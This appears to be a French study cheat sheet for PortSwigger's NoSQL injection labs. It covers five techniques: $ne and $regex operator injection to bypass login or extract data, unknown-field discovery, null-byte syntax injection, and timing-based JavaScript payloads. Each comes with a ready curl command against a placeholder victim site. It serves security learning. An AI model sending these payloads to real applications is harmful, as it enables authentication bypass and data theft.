# NoSql

1. Type / Lab : Exploiting NoSQL operator injection to bypass authentication  
  - Payload d’attaque neutre (exemple brut) : username=`{"$ne":""}` et password=`{"$ne":""}`  
  - Commande d’attaque (exemple complet) :  
    curl -X POST -d 'username={"$ne":""}&password={"$ne":""}' https://site-victime.net/login  
  - Commande d’analyse (exemple complet) :  
    Observer si la connexion est acceptée sans identifiants valides (réponse HTTP 200, accès à l’interface administrateur).  
  - Élément d’analyse détaillé : Vérifier si l’API transmet directement les objets reçus à la requête MongoDB, permettant à l’opérateur `$ne` de matcher tous les utilisateurs et de contourner l’authentification.  
  - Méthodologie détaillée de découverte : Injecter des opérateurs MongoDB (`$ne`, `$regex`, etc.) dans les champs d’entrée, observer si des accès non autorisés sont accordés.  
  - Source : https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication

2. Type / Lab : Exploiting NoSQL injection to extract data  
  - Payload d’attaque neutre (exemple brut) : username=`administrator` et password=`{"$regex":".*"}`  
  - Commande d’attaque (exemple complet) :  
    curl -X POST -d 'username=administrator&password={"$regex":".*"}' https://site-victime.net/login  
  - Commande d’analyse (exemple complet) :  
    Observer si la réponse retourne des informations inattendues ou permet de deviner le mot de passe de l’administrateur (ex : affichage du mot de passe ou d’un message d’erreur différent).  
  - Élément d’analyse détaillé : Détecter si l’application accepte des opérateurs MongoDB dans les paramètres et permet d’élargir les résultats ou d’extraire des données sensibles.  
  - Méthodologie détaillée de découverte : Injecter des opérateurs comme `$regex`, `$where`, `$gt` dans les champs, observer si la réponse contient plus d’informations que prévu ou si des données sont exfiltrées.  
  - Source : https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

3. Type / Lab : Exploiting NoSQL operator injection to extract unknown fields  
  - Payload d’attaque neutre (exemple brut) : username=`carlos` et injection d’opérateurs pour deviner le nom ou la valeur de champs inconnus (ex : `{"$where":"this.secret!=null"}`)  
  - Commande d’attaque (exemple complet) :  
    curl -X POST -d 'username=carlos&field={"$ne":null}' https://site-victime.net/lookup  
  - Commande d’analyse (exemple complet) :  
    Observer si la réponse retourne des champs inattendus ou permet d’identifier de nouveaux champs à exfiltrer (ex : token de reset, données cachées).  
  - Élément d’analyse détaillé : Détecter si l’application permet d’injecter des opérateurs pour révéler ou extraire des champs non documentés ou inconnus.  
  - Méthodologie détaillée de découverte : Injecter des opérateurs dans différents champs, observer les variations de réponse, puis affiner pour deviner ou exfiltrer des champs inconnus.  
  - Source : https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

4. Type / Lab : Exploiting NoSQL syntax injection (syntaxe, fuzzing, null byte)  
  - Payload d’attaque neutre (exemple brut) : Ajout d’un null byte ou d’un caractère spécial dans un paramètre (ex : category=`fizzy'%00`)  
  - Commande d’attaque (exemple complet) :  
    curl "https://site-victime.net/product/lookup?category=fizzy'%00"  
  - Commande d’analyse (exemple complet) :  
    Observer si la requête retourne des produits non publiés ou si des conditions de la requête sont ignorées après le null byte.  
  - Élément d’analyse détaillé : Détecter si l’injection de caractères spéciaux ou de null byte permet de manipuler la syntaxe de la requête et d’accéder à des données non prévues.  
  - Méthodologie détaillée de découverte : Injecter des caractères spéciaux ou des null bytes dans différents paramètres, observer les changements de comportement ou d’accès aux données.  
  - Source : https://portswigger.net/web-security/nosql-injection

5. Type / Lab : Exploiting NoSQL injection via timing-based payloads  
  - Payload d’attaque neutre (exemple brut) : username=`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password==="a") && waitTill > new Date()){};}(this)+'`  
  - Commande d’attaque (exemple complet) :  
    curl -X POST -d 'username=admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password==="a") && waitTill > new Date()){};}(this)+'&password=test' https://site-victime.net/login  
  - Commande d’analyse (exemple complet) :  
    Comparer le temps de réponse du serveur selon la valeur injectée, pour détecter une exécution conditionnelle côté base de données.  
  - Élément d’analyse détaillé : Détecter si l’application exécute du code JavaScript côté base, permettant des attaques avancées (extraction caractère par caractère, DoS, etc.).  
  - Méthodologie détaillée de découverte : Injecter des payloads de temporisation dans les champs, mesurer les délais de réponse pour confirmer l’exécution du code injecté.  
  - Source : https://portswigger.net/web-security/nosql-injection

---

